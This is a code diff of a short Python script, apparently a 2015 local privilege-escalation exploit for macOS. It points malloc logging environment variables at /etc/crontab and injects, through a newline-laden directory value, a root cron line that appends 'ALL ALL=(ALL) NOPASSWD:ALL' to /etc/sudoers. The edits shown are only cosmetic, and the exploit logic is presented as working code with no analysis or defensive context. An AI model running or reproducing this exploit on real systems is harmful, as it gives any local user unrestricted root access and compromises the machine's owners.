@@ -4,7 +4,6 @@
 # jul/2015
 import os,time,sys,subprocess
 whoami = subprocess.check_output(['whoami'])
-import os,time,sys
 
 env = {}
 
@@ -12,7 +11,7 @@ s = os.stat("/etc/sudoers").st_size
 
 env['MallocLogFile'] = '/etc/crontab'
 env['MallocStackLogging'] = 'yes'
-env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers\n\n\n\n\n'
+env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo "ALL ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n'
 
 sys.stderr.write("creating /etc/crontab..")
 
